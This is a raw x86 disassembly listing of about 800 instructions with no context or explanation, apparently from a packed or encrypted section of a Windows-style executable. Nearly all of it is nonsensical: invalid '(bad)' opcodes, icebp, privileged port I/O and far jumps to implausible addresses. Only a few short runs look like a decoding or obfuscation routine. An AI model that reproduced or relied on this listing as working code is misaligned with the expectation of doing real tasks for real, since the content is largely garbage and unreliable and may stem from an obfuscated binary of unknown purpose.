  40ac76:	rcl    DWORD PTR [ebx-0x2e95cc89],0x9
  40ac7d:	fist   DWORD PTR [eax+edi*2-0x6]
  40ac81:	data16 cmp bh,BYTE PTR [ecx-0xc]
  40ac85:	adc    BYTE PTR [esi-0x1497a986],bh
  40ac8b:	test   eax,0x9391a7ba
  40ac90:	nop
  40ac91:	mov    DWORD PTR [ecx+0x1a],ebp
  40ac94:	mov    bh,0x11
  40ac96:	dec    esp
  40ac97:	xor    dh,0xa8
  40ac9a:	gs dec esi
  40ac9c:	pop    esi
  40ac9d:	retf   
  40ac9e:	out    dx,al
  40ac9f:	inc    edx
  40aca0:	mov    ch,0xba
  40aca2:	in     al,dx
  40aca3:	dec    ecx
  40aca4:	pushf  
  40aca5:	pop    esi
  40aca6:	iret   
  40aca7:	nop
  40aca8:	icebp  
  40aca9:	icebp  
  40acaa:	(bad)  
  40acab:	neg    DWORD PTR [edi+0x57ff20fb]
  40acb1:	sub    eax,0x141b2d0a
  40acb6:	mov    al,dl
  40acb8:	xor    eax,0x3834b8dd
  40acbd:	xchg   edx,eax
  40acbe:	or     eax,0x7f2205ef
  40acc3:	std    
  40acc4:	test   DWORD PTR [eax-0x7e25a24],ebp
  40acca:	push   esi
  40accb:	aas    
  40accc:	jnp    0x40ac93
  40acce:	xor    BYTE PTR [eax-0x3a249d78],dl
  40acd4:	aas    
  40acd5:	scas   eax,DWORD PTR es:[edi]
  40acd6:	jo     0x40ad13
  40acd8:	jbe    0x40ac6b
  40acda:	scas   al,BYTE PTR es:[edi]
  40acdb:	dec    ebp
  40acdc:	(bad)  
  40acdd:	stos   DWORD PTR es:[edi],eax
  40acde:	mov    dh,BYTE PTR [esi+0x427c4976]
  40ace4:	lahf   
  40ace5:	das    
  40ace6:	lds    esi,FWORD PTR ds:0xb8a7dddb
  40acec:	cdq    
  40aced:	ins    BYTE PTR es:[edi],dx
  40acee:	arpl   WORD PTR [ebx],cx
  40acf0:	inc    ecx
  40acf1:	ror    DWORD PTR [ebx-0x3b],cl
  40acf4:	aad    0x93
  40acf6:	test   eax,0x1c338c61
  40acfb:	jb     0x40acf2
  40acfd:	out    dx,eax
  40acfe:	jnp    0x40ac96
  40ad00:	retf   
  40ad01:	jmp    0x40ac95
  40ad03:	mov    edi,es
  40ad05:	xchg   eax,ecx
  40ad07:	mov    cl,0xde
  40ad09:	aaa    
  40ad0a:	test   eax,edi
  40ad0c:	push   0x11
  40ad0e:	fistp  WORD PTR [ebp+0x2ef30950]
  40ad14:	(bad)  
  40ad15:	call   0x1e709a62
  40ad1a:	inc    esi
  40ad1b:	icebp  
  40ad1c:	jmp    0x40ad4b
  40ad1e:	lahf   
  40ad1f:	icebp  
  40ad20:	sub    eax,0x3fa37f24
  40ad25:	gs ret 
  40ad27:	mov    eax,0xcf1521dc
  40ad2c:	add    ah,al
  40ad2e:	and    BYTE PTR [esi],0x53
  40ad31:	repnz xor bh,BYTE PTR [ecx]
  40ad34:	sar    ch,cl
  40ad36:	cmp    al,0xfa
  40ad38:	mov    al,0x3
  40ad3a:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40ad41:	add    al,0x8
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi-0x3a2d839]
  40ad81:	pop    ebx
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	or     cl,bl
  40ad8c:	mov    edi,0xe66053f2
  40ad91:	nop
  40ad92:	xlat   BYTE PTR ds:[ebx]
  40ad93:	mov    ds,WORD PTR [esi-0x7c]
  40ad96:	push   es
  40ad97:	and    ecx,esp
  40ad99:	ins    BYTE PTR es:[edi],dx
  40ad9a:	mov    bh,ah
  40ad9c:	aad    0xf
  40ad9e:	lock dec ebp
  40ada0:	int    0x20
  40ada2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ada3:	sbb    dh,BYTE PTR [ebx]
  40ada5:	(bad)  
  40ada6:	cwde   
  40ada7:	sar    DWORD PTR [eax],cl
  40ada9:	add    edi,DWORD PTR [ebp-0x60f2f20c]
  40adaf:	shl    DWORD PTR [edi],0x25
  40adb2:	inc    ebx
  40adb3:	sbb    DWORD PTR [ebx+0x7e9d6d3f],edx
  40adb9:	loop   0x40adcd
  40adbb:	adc    DWORD PTR [ecx],eax
  40adbd:	mov    BYTE PTR ss:[edx],dl
  40adc0:	push   ebp
  40adc1:	mov    esi,0x52c34748
  40adc6:	or     al,0x69
  40adc8:	sub    al,0x44
  40adca:	sbb    al,0xf5
  40adcc:	sub    bh,BYTE PTR [ebx]
  40adce:	jne    0x40ae49
  40add0:	mov    al,0xe
  40add2:	mov    bl,0xb0
  40add4:	sbb    al,0x69
  40add6:	jns    0x40ad76
  40add8:	out    dx,al
  40add9:	or     DWORD PTR [eax-0x51],0x79
  40addd:	pminsw mm5,QWORD PTR [edi-0x39]
  40ade1:	push   edx
  40ade2:	and    ecx,DWORD PTR [esi+0x5a]
  40ade5:	test   eax,0x864a85b6
  40adea:	cmp    al,cl
  40adec:	xchg   BYTE PTR [ebx+eax*4-0x56b84a1f],ah
  40adf3:	lods   eax,DWORD PTR ds:[esi]
  40adf4:	(bad)  
  40adf5:	int3   
  40adf6:	mov    esi,DWORD PTR [esi-0xad7c4ca]
  40adfc:	stos   BYTE PTR es:[edi],al
  40adfd:	push   edx
  40adfe:	ret    
  40adff:	imul   esp,DWORD PTR [ebp+edx*2+0x55a01467],0x24
  40ae07:	daa    
  40ae08:	retf   
  40ae09:	fxch   st(3)
  40ae0b:	adc    DWORD PTR [eax-0x5e],0xfffffffa
  40ae0f:	scas   al,BYTE PTR es:[edi]
  40ae10:	retf   0x93e3
  40ae13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae14:	push   ebp
  40ae15:	cmp    BYTE PTR [edx-0x63],dl
  40ae18:	xlat   BYTE PTR ds:[ebx]
  40ae19:	outs   dx,BYTE PTR ds:[esi]
  40ae1a:	popf   
  40ae1b:	xchg   DWORD PTR [esi+0x61],esp
  40ae1e:	test   BYTE PTR cs:[ebx-0x6],ah
  40ae22:	cmc    
  40ae23:	jp     0x40ae2a
  40ae25:	pop    ebp
  40ae26:	dec    ebp
  40ae27:	sub    eax,0xc5d8d723
  40ae2c:	ror    DWORD PTR [ecx+0x112e6af5],1
  40ae32:	and    al,bl
  40ae34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae35:	jae    0x40add5
  40ae37:	mov    ecx,0x41393864
  40ae3c:	test   al,0xa1
  40ae3e:	cmp    DWORD PTR [esi+0x6f4f5331],esp
  40ae44:	mov    bh,0x8b
  40ae46:	xchg   BYTE PTR [ecx],ch
  40ae48:	xchg   esp,eax
  40ae49:	mov    DWORD PTR [ebx-0x2090229e],ecx
  40ae4f:	mov    edi,0x57d3bd99
  40ae54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae55:	ret    0xbb0e
  40ae58:	xchg   ebx,eax
  40ae59:	neg    BYTE PTR [ebx+eiz*4-0x533ded4]
  40ae60:	xchg   BYTE PTR [ecx-0x6ec64bb5],al
  40ae66:	call   0x22c27701
  40ae6b:	scas   eax,DWORD PTR es:[edi]
  40ae6c:	jne    0x40aebd
  40ae6e:	xchg   edx,eax
  40ae6f:	sub    dh,cl
  40ae71:	(bad)  
  40ae72:	ja     0x40ae1e
  40ae74:	hlt    
  40ae75:	out    dx,al
  40ae76:	mov    esp,0x4baec6dc
  40ae7b:	cdq    
  40ae7c:	push   cs
  40ae7d:	cmp    al,0x71
  40ae7f:	loopne 0x40ae52
  40ae81:	scas   eax,DWORD PTR es:[edi]
  40ae82:	lds    ebx,FWORD PTR [esi+ebp*1+0x7c]
  40ae86:	xchg   esi,eax
  40ae87:	hlt    
  40ae88:	mov    BYTE PTR [ebx+0x283491c8],ch
  40ae8e:	sbb    DWORD PTR [edi+esi*2-0x14],edi
  40ae92:	seto   BYTE PTR [edi+0x31656285]
  40ae99:	inc    edx
  40ae9a:	jbe    0x40ae34
  40ae9c:	jg     0x40af10
  40ae9e:	inc    ebx
  40ae9f:	mov    ebx,esi
  40aea1:	sbb    esi,DWORD PTR [ebx+0x5dd84ca]
  40aea7:	xchg   esi,eax
  40aea8:	cmp    DWORD PTR [edx+0x37],eax
  40aeab:	push   eax
  40aeac:	fst    QWORD PTR [edi]
  40aeae:	and    dl,BYTE PTR [edx+0x28]
  40aeb1:	hlt    
  40aeb2:	mov    al,0xe
  40aeb4:	ror    DWORD PTR [ebp+0x13],cl
  40aeb7:	int3   
  40aeb8:	add    BYTE PTR [ebp-0x5cc8643a],al
  40aebe:	lods   al,BYTE PTR ds:[esi]
  40aebf:	mov    eax,ds:0x95538c04
  40aec4:	cmp    al,0xd4
  40aec6:	lods   al,BYTE PTR ds:[esi]
  40aec7:	mov    ds:0x793a957d,al
  40aecc:	sbb    dl,dh
  40aece:	xchg   esp,eax
  40aecf:	vmovlps xmm6,xmm5,QWORD PTR [edi+0x2cbba859]
  40aed7:	mov    bl,0x29
  40aed9:	pop    edi
  40aeda:	push   0xf265ddb0
  40aedf:	fnstsw WORD PTR [ebx]
  40aee1:	cwde   
  40aee2:	loopne 0x40af3a
  40aee4:	popf   
  40aee5:	adc    esi,DWORD PTR [ecx-0x2a3ca822]
  40aeeb:	out    dx,al
  40aeec:	xor    al,BYTE PTR [ecx+0x749eac9e]
  40aef2:	out    0x87,eax
  40aef4:	clc    
  40aef5:	pop    eax
  40aef6:	cmp    ecx,DWORD PTR [edi-0xc]
  40aef9:	mov    eax,fs:0x545b87c9
  40aeff:	lea    ebp,[ebx]
  40af01:	push   cs
  40af02:	mov    edi,0x7ea1667b
  40af07:	loope  0x40aeaf
  40af09:	mov    esi,0xcc2bf3f5
  40af0e:	mov    ebx,0x481bc103
  40af13:	gs inc ebx
  40af15:	in     eax,dx
  40af16:	jae    0x40af51
  40af18:	or     ebx,esp
  40af1a:	fiadd  WORD PTR [ecx]
  40af1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af1d:	jg     0x40af56
  40af1f:	mov    eax,DWORD PTR [ecx-0x4230a71f]
  40af25:	out    0xc0,eax
  40af27:	fwait
  40af28:	addr16 into 
  40af2a:	push   ebx
  40af2b:	pop    ecx
  40af2c:	popf   
  40af2d:	pop    ss
  40af2e:	popa   
  40af2f:	jbe    0x40afa6
  40af31:	xchg   ebp,eax
  40af32:	out    0x8b,eax
  40af34:	pop    ds
  40af35:	(bad)  
  40af36:	and    esi,ecx
  40af38:	ds inc esp
  40af3a:	pop    ecx
  40af3b:	shr    edx,1
  40af3d:	pop    esi
  40af3e:	mov    DWORD PTR [edx+ecx*8+0x48],edi
  40af42:	add    cl,dh
  40af44:	test   BYTE PTR [edx-0x2e41aaa5],cl
  40af4a:	and    BYTE PTR [ecx],al
  40af4c:	retf   0x6b75
  40af4f:	mov    ah,0xad
  40af51:	inc    eax
  40af52:	or     eax,0xc1003fe7
  40af57:	mov    bl,0x53
  40af59:	add    ebp,DWORD PTR [edx]
  40af5b:	in     eax,dx
  40af5c:	(bad)  
  40af5d:	test   esp,0x9de80a3c
  40af63:	jnp    0x40af2c
  40af65:	int    0x24
  40af67:	mov    esp,0x7f16e83e
  40af6c:	enter  0x49c4,0xaf
  40af70:	aas    
  40af71:	mov    cl,0xb0
  40af73:	retf   0x4fb9
  40af76:	fdivr  st(3),st
  40af78:	mov    bh,0xe6
  40af7a:	push   ebp
  40af7b:	push   0xf1c2ba13
  40af80:	mov    al,ds:0x19c47428
  40af85:	stos   DWORD PTR es:[edi],eax
  40af86:	mov    cl,0x8c
  40af88:	retf   
  40af89:	cmp    BYTE PTR [edi-0x56],bh
  40af8c:	inc    ebx
  40af8d:	push   ecx
  40af8e:	scas   eax,DWORD PTR es:[edi]
  40af8f:	sub    cl,BYTE PTR [ecx+0x2a]
  40af92:	mov    edi,0x310432b1
  40af97:	or     BYTE PTR [eax+0x77e83937],ch
  40af9d:	cld    
  40af9e:	fneni(8087 only) 
  40afa0:	adc    al,0x38
  40afa2:	sub    ebx,DWORD PTR ds:0xc68c4b11
  40afa8:	sbb    ebx,0x681412e7
  40afae:	inc    ebp
  40afaf:	lea    esi,[eax-0x64]
  40afb2:	cwde   
  40afb3:	cmp    ch,BYTE PTR [edi+0x2f]
  40afb6:	out    0xeb,eax
  40afb8:	sbb    al,0x17
  40afba:	cli    
  40afbb:	fbstp  TBYTE PTR [ebx-0x7a824d7a]
  40afc1:	push   esp
  40afc2:	or     BYTE PTR [edi+0x544f9b0c],cl
  40afc8:	pushf  
  40afc9:	and    al,0xaf
  40afcb:	inc    BYTE PTR [edi-0x1]
  40afce:	mov    edx,0x45ce0e6a
  40afd3:	clc    
  40afd4:	mov    edx,0x8f923717
  40afd9:	inc    ebp
  40afda:	pop    edi
  40afdb:	inc    edi
  40afdc:	fdiv   QWORD PTR [ebx]
  40afde:	add    al,0x58
  40afe0:	lds    esi,FWORD PTR [eax-0x6d145808]
  40afe6:	cmp    esi,ebx
  40afe8:	gs cmp al,0x2
  40afeb:	das    
  40afec:	in     al,dx
  40afed:	lods   al,BYTE PTR ds:[esi]
  40afee:	and    DWORD PTR [ecx-0xebf33f8],0x95e9899c
  40aff8:	pusha  
  40aff9:	retf   
  40affa:	xchg   ebp,eax
  40affb:	cmpxchg DWORD PTR [eax-0x1b],eax
  40afff:	nop
  40b000:	(bad)  
  40b001:	push   ebp
  40b002:	dec    edx
  40b003:	int    0x6a
  40b005:	fwait
  40b006:	mov    DWORD PTR [ebp-0x764e6e07],edx
  40b00c:	add    cl,al
  40b00e:	mov    ebx,0xe26bd3f0
  40b013:	sbb    bh,BYTE PTR [ebx]
  40b015:	fmul   DWORD PTR [ebx+eax*2]
  40b018:	addr16 (bad) 
  40b01b:	cmp    DWORD PTR [ebp+0x2b],esp
  40b01e:	enterw 0xacf9,0x99
  40b023:	and    eax,0x2346fc8d
  40b028:	adc    BYTE PTR [ebp+ecx*4-0x39f05134],0xac
  40b030:	xor    al,0x15
  40b032:	mov    dl,0xef
  40b034:	pop    ebp
  40b035:	jmp    0xece4:0xbaa836d0
  40b03c:	popf   
  40b03d:	inc    esi
  40b03e:	pop    edx
  40b03f:	or     dl,BYTE PTR [edx+0x452d3622]
  40b045:	das    
  40b046:	dec    ebp
  40b047:	jmp    0xb2a:0xf9b83068
  40b04e:	adc    DWORD PTR [eax-0x10],0xffffffdb
  40b052:	dec    ebp
  40b053:	(bad)  
  40b055:	jmp    0xd245:0xc03b3f39
  40b05c:	push   eax
  40b05d:	inc    edi
  40b05e:	sub    cl,BYTE PTR [ecx-0x3f4bd2c8]
  40b064:	fadd   QWORD PTR [ecx]
  40b066:	adc    al,0x47
  40b068:	xchg   edi,eax
  40b069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b06a:	and    eax,0x314b16ae
  40b06f:	popa   
  40b070:	retf   
  40b071:	inc    ebx
  40b072:	nop
  40b073:	test   eax,0xdadf9642
  40b078:	je     0x40b0ca
  40b07a:	sub    DWORD PTR [eax],edi
  40b07c:	mov    eax,ds:0x3ebfed67
  40b081:	jge    0x40b0dc
  40b083:	xor    al,0x25
  40b085:	sub    ah,dl
  40b087:	lahf   
  40b088:	outs   dx,BYTE PTR ds:[esi]
  40b089:	out    dx,al
  40b08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b08b:	add    dh,BYTE PTR [esp+esi*8-0x741fba75]
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	jno    0x40b045
  40b0bb:	push   eax
  40b0bc:	jb     0x40b0ca
  40b0be:	(bad)  
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	add    al,dl
  40b0c7:	fdiv   DWORD PTR [ebp+0x45d7a093]
  40b0cd:	daa    
  40b0ce:	fisttp DWORD PTR [edi+edi*2-0x31]
  40b0d2:	rcl    DWORD PTR ds:0x27a824f0,1
  40b0d8:	mov    ecx,0x548e2d0b
  40b0dd:	jbe    0x40b135
  40b0df:	and    BYTE PTR [ecx-0x30],dh
  40b0e2:	push   0xffffffed
  40b0e4:	pushf  
  40b0e5:	in     eax,0x2b
  40b0e7:	cmp    dh,BYTE PTR [ebx-0x45]
  40b0ea:	inc    eax
  40b0eb:	add    eax,0x4e8b2743
  40b0f0:	test   eax,0x61b049e4
  40b0f5:	and    edi,DWORD PTR [esi]
  40b0f7:	out    0xca,eax
  40b0f9:	iret   
  40b0fa:	fisub  WORD PTR [eax-0x33]
  40b0fd:	push   0x44e47d04
  40b102:	jbe    0x40b171
  40b104:	sahf   
  40b105:	shl    esi,1
  40b107:	mov    DWORD PTR [edi-0x40],esi
  40b10a:	sbb    eax,0xc463335a
  40b10f:	stos   DWORD PTR es:[edi],eax
  40b110:	lock xlat BYTE PTR ds:[bx]
  40b113:	outs   dx,BYTE PTR ds:[si]
  40b115:	in     eax,0xde
  40b117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b118:	push   eax
  40b119:	das    
  40b11a:	add    DWORD PTR [ebx-0x23],0x19
  40b11e:	test   DWORD PTR [esi-0x5d85fad9],ecx
  40b124:	push   ds
  40b125:	test   eax,0xb9dd992f
  40b12a:	xchg   esp,eax
  40b12b:	fnsave [ebp+ebx*4-0x21]
  40b12f:	pop    ds
  40b130:	fiadd  WORD PTR cs:[esi+0x2360440b]
  40b138:	(bad)  
  40b139:	(bad)  
  40b13a:	jge    0x40b0d0
  40b13c:	mov    cl,0x7
  40b13e:	mov    dl,0x1
  40b140:	pop    ebx
  40b141:	jmp    0x140a3743
  40b146:	dec    ebp
  40b147:	inc    ecx
  40b148:	or     DWORD PTR [esi+esi*2+0xf30324],esp
  40b14f:	std    
  40b150:	nop
  40b151:	lods   al,BYTE PTR ds:[esi]
  40b152:	cs loopne 0x40b16c
  40b155:	fdivr  QWORD PTR [edx+0x872e48a]
  40b15b:	add    DWORD PTR [eax+ebp*1-0x10e51944],esi
  40b162:	sbb    ecx,edi
  40b164:	jne    0x40b1ca
  40b166:	sub    eax,0x34686cf1
  40b16b:	mov    ebp,DWORD PTR [ecx-0x72e84f31]
  40b171:	cwde   
  40b172:	mov    esp,0xf575fcd2
  40b177:	sub    al,BYTE PTR [eax-0x73]
  40b17a:	adc    eax,0x1a308702
  40b17f:	lods   eax,DWORD PTR ds:[esi]
  40b180:	jg     0x40b11e
  40b182:	kunpckbw k0,k6,k1
  40b186:	mov    al,0xa9
  40b188:	sbb    BYTE PTR [edx],dl
  40b18a:	mov    cs,WORD PTR [ecx-0x3145cdf4]
  40b190:	mov    al,BYTE PTR [edi+esi*4-0x4d275a4a]
  40b197:	cli    
  40b198:	icebp  
  40b199:	icebp  
  40b19a:	popa   
  40b19b:	and    bh,0x1f
  40b19e:	les    eax,FWORD PTR cs:[esi+esi*4]
  40b1a2:	adc    esi,eax
  40b1a4:	or     BYTE PTR [eax+0x6a],0xf5
  40b1a8:	xor    eax,0x380ee457
  40b1ad:	loopne 0x40b20a
  40b1af:	scas   eax,DWORD PTR es:[edi]
  40b1b0:	rcr    DWORD PTR [ebx],1
  40b1b2:	jge    0x40b19c
  40b1b4:	popa   
  40b1b5:	adc    al,0xe4
  40b1b7:	sub    dh,BYTE PTR [edi-0x66dc0762]
  40b1bd:	mov    edx,0xd68b17dc
  40b1c2:	jmp    0xe9c49fac
  40b1c7:	sub    esi,DWORD PTR [edx]
  40b1c9:	addr16 push ds
  40b1cb:	sbb    BYTE PTR [edx],0x67
  40b1ce:	adc    al,0x31
  40b1d0:	and    al,0x45
  40b1d2:	cdq    
  40b1d3:	int3   
  40b1d4:	inc    edx
  40b1d5:	push   ebx
  40b1d6:	adc    BYTE PTR [edi+0x4bd014],ch
  40b1dc:	mov    cl,BYTE PTR [ebp-0x23]
  40b1df:	cmp    eax,0xa03845ec
  40b1e4:	cs in  eax,dx
  40b1e6:	sub    BYTE PTR [edi],ch
  40b1e8:	fwait
  40b1e9:	daa    
  40b1ea:	sbb    eax,DWORD PTR [edi+0x16ddf59c]
  40b1f0:	inc    ebx
  40b1f1:	iret   
  40b1f2:	in     eax,0x6f
  40b1f4:	lods   al,BYTE PTR ds:[esi]
  40b1f5:	or     eax,0xa8990af
  40b1fa:	stc    
  40b1fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1fc:	or     ebp,DWORD PTR [ecx-0x456b18bb]
  40b202:	pop    esp
  40b203:	cmp    eax,0xd5c8a3f1
  40b208:	call   0xe1f7:0x74eaaf17
  40b20f:	je     0x40b259
  40b211:	leave  
  40b212:	and    al,0x77
  40b214:	retf   
  40b215:	fbld   TBYTE PTR [esi-0x5b282c69]
  40b21b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b21c:	pop    esp
  40b21d:	cmp    DWORD PTR fs:[edi+edx*1+0x26985dbc],ebp
  40b225:	in     eax,dx
  40b226:	add    eax,0xdde777fb
  40b22b:	inc    edi
  40b22c:	popf   
  40b22d:	jecxz  0x40b299
  40b22f:	adc    ecx,edx
  40b231:	loop   0x40b230
  40b233:	sub    eax,0x4efd6b30
  40b238:	out    dx,al
  40b239:	sub    edx,DWORD PTR [ecx]
  40b23b:	jbe    0x40b227
  40b23d:	jmp    0xe48f3357
  40b242:	fidiv  DWORD PTR [edx]
  40b244:	dec    ebx
  40b245:	adc    ah,BYTE PTR [ebx+0x5f]
  40b248:	adc    DWORD PTR [esi+esi*4+0x4d507451],edx
  40b24f:	or     DWORD PTR [ecx-0x58],esi
  40b252:	sub    DWORD PTR ds:0x24e6d7a,esi
  40b258:	push   ebp
  40b259:	pushf  
  40b25a:	mov    bl,0x6
  40b25c:	inc    ebp
  40b25d:	push   edx
  40b25e:	adc    BYTE PTR [ebx-0x18],dh
  40b261:	in     eax,dx
  40b262:	fcomp  QWORD PTR [ecx-0x51e98481]
  40b268:	pop    ecx
  40b269:	jns    0x40b29c
  40b26b:	push   edx
  40b26c:	bound  ecx,QWORD PTR [esi-0x6f]
  40b26f:	dec    ebp
  40b270:	jge    0x40b22a
  40b272:	add    ah,al
  40b274:	push   edx
  40b275:	das    
  40b276:	adc    esp,DWORD PTR [esi+0x4f]
  40b279:	push   edx
  40b27a:	cmp    bl,BYTE PTR [edx]
  40b27c:	adc    ch,bl
  40b27e:	dec    esi
  40b27f:	xchg   edi,eax
  40b280:	xor    eax,0x130dccfb
  40b285:	pop    ds
  40b286:	(bad)  
  40b287:	push   0x93f9a00e
  40b28c:	int    0xe1
  40b28e:	jmp    0x3fff:0xba9c1503
  40b295:	neg    DWORD PTR [edx+esi*1]
  40b298:	inc    esp
  40b299:	add    eax,0x5c0584ff
  40b29e:	or     ebp,DWORD PTR [edx+0x25]
  40b2a1:	repz leave 
  40b2a3:	bound  eax,QWORD PTR [eax+0x54]
  40b2a6:	nop
  40b2a7:	imul   ebp,edx,0x71c2980f
  40b2ad:	out    0xe1,al
  40b2af:	lahf   
  40b2b0:	arpl   WORD PTR ds:0x86d8a722,cx
  40b2b6:	shl    DWORD PTR [edi-0x3a],1
  40b2b9:	cld    
  40b2ba:	push   esp
  40b2bb:	jnp    0x40b2ec
  40b2bd:	xlat   BYTE PTR ds:[ebx]
  40b2be:	sbb    cl,BYTE PTR [ecx]
  40b2c0:	xchg   edi,eax
  40b2c1:	xor    al,0x85
  40b2c3:	test   eax,0x8819166d
  40b2c8:	sbb    cl,al
  40b2ca:	sti    
  40b2cb:	jne    0x40b2a0
  40b2cd:	add    eax,0x594a6b3a
  40b2d2:	jg     0x40b259
  40b2d4:	jmp    0x40b288
  40b2d6:	sbb    DWORD PTR [edi+0x3c756513],ebp
  40b2dc:	cmp    BYTE PTR [ebp-0x374e796f],cl
  40b2e2:	dec    ecx
  40b2e3:	or     BYTE PTR [edi],0xe0
  40b2e6:	adc    al,0xb1
  40b2e8:	(bad)  
  40b2ea:	inc    esp
  40b2eb:	dec    ecx
  40b2ec:	adc    cl,dh
  40b2ee:	outs   dx,BYTE PTR ds:[esi]
  40b2ef:	push   eax
  40b2f0:	sub    dl,0xbf
  40b2f3:	or     eax,0xded7c082
  40b2f8:	dec    ecx
  40b2f9:	pop    es
  40b2fa:	jns    0x40b363
  40b2fc:	sbb    DWORD PTR [ebx],ebp
  40b2fe:	lahf   
  40b2ff:	cmp    dl,BYTE PTR [esi]
  40b301:	add    esi,ebx
  40b303:	shr    BYTE PTR [esi+0x1b],cl
  40b306:	push   esp
  40b307:	mov    dh,0x12
  40b309:	xchg   DWORD PTR [ecx+0x7],ebx
  40b30c:	mov    ds:0x600a34b2,al
  40b311:	cwde   
  40b312:	or     esi,DWORD PTR [ebx+0x1d]
  40b315:	test   BYTE PTR [eax],al
  40b317:	test   BYTE PTR [esi-0x47],al
  40b31a:	inc    ebx
  40b31b:	jno    0x40b2f2
  40b31d:	xchg   edi,eax
  40b31e:	loop   0x40b2ae
  40b320:	add    edi,DWORD PTR [ebx-0x1b]
  40b323:	dec    esp
  40b324:	mov    ds:0xa575a096,al
  40b329:	pop    ebp
  40b32a:	adc    BYTE PTR [esi+0x5099633b],dl
  40b330:	jns    0x40b335
  40b332:	mov    esi,0xb3ed452f
  40b337:	das    
  40b338:	dec    esp
  40b339:	inc    edx
  40b33a:	aaa    
  40b33b:	push   esi
  40b33c:	cmp    eax,0x59701b9e
  40b341:	push   edi
  40b342:	stos   DWORD PTR es:[edi],eax
  40b343:	stc    
  40b344:	popa   
  40b345:	not    ah
  40b347:	(bad)  
  40b348:	arpl   WORD PTR [eax+0x54],si
  40b34b:	mov    edx,0xde62bee8
  40b350:	xor    eax,0x8dfce9b
  40b355:	and    eax,0x74cc19f7
  40b35a:	adc    eax,0xe5da5900
  40b35f:	or     al,0xb1
  40b361:	mov    edx,DWORD PTR [eax-0x67f06542]
  40b367:	mov    eax,ds:0x637fda86
  40b36c:	in     eax,0x87
  40b36e:	test   BYTE PTR [ebx-0x54595b30],ch
  40b374:	and    eax,0x6e9e035b
  40b379:	arpl   di,bp
  40b37b:	push   ss
  40b37c:	cmp    BYTE PTR [esp+ebx*1],bh
  40b37f:	leave  
  40b380:	mov    bh,0x92
  40b382:	dec    eax
  40b383:	outs   dx,BYTE PTR ds:[esi]
  40b384:	leave  
  40b385:	imul   DWORD PTR [esi+0x3c78a335]
  40b38b:	or     DWORD PTR [esp+eax*8-0x40],ebx
  40b38f:	or     esi,DWORD PTR [eax+0x24]
  40b392:	inc    edi
  40b393:	add    al,0x3d
  40b395:	lods   al,BYTE PTR ds:[esi]
  40b396:	cmp    dh,BYTE PTR [edx+0x749b5a6d]
  40b39c:	adc    eax,0xb51e79f4
  40b3a1:	and    eax,0x887512ba
  40b3a6:	inc    esp
  40b3a7:	mov    es,WORD PTR [ecx*2+0x1f2939ea]
  40b3ae:	imul   ebp,ecx,0xffffffd6
  40b3b1:	pop    esi
  40b3b2:	and    eax,esp
  40b3b4:	call   0x10e44523
  40b3b9:	cs (bad) 
  40b3bb:	cwde   
  40b3bc:	xchg   ecx,eax
  40b3bd:	adc    DWORD PTR [esi],ebx
  40b3bf:	xor    eax,0xda45f62e
  40b3c4:	cmp    esp,DWORD PTR [ebx-0x6c]
  40b3c7:	packuswb mm1,QWORD PTR [ebx+0x4d8b0845]
  40b3ce:	clc    
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0xf106f5f9
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	add    DWORD PTR [eax+0x29bea522],ebp
  40b3f6:	sar    bl,1
  40b3f8:	add    al,bl
  40b3fa:	xchg   BYTE PTR es:[ebp-0x1e],ch
  40b3fe:	xchg   BYTE PTR [ebp+0x70],al
  40b401:	cmp    eax,edi
  40b403:	pop    esi
  40b404:	sbb    DWORD PTR [ebp+0x5a39b0bc],edi
